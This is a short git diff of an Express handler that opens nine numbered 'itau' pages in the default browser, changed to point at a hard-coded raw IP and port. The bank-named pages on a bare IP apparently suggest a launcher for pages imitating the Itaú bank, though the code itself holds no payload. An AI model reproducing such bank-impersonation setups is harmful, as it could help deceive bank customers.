@@ -8,18 +8,16 @@ const app = express()
 app.use(express.json())
 
 export default function Gemini (req, res) {
-  (async (req, res) => {
-    // Opens the url in the default browser
-    await open('/itau')
-    await open('/itau2')
-    await open('/itau4')
-    await open('/itau5')
-    await open('/itau6')
-    await open('/itau7')
-    await open('/itau8')
-    await open('/itau9')
-    await open('/itau10')
+  // Opens the url in the default browser
+  open('45.179.89.8:33333/itau')
+  open('45.179.89.8:33333/itau2')
+  open('45.179.89.8:33333/itau4')
+  open('45.179.89.8:33333/itau5')
+  open('45.179.89.8:33333/itau6')
+  open('45.179.89.8:33333/itau7')
+  open('45.179.89.8:33333/itau8')
+  open('45.179.89.8:33333/itau9')
+  open('45.179.89.8:33333/itau10')
 
-    console.log(new AppSuccess(' Todas as aplicações foram iniciadas com sucesso!'))
-  })()
+  console.log(new AppSuccess(' Todas as aplicações foram iniciadas com sucesso!'))
 }
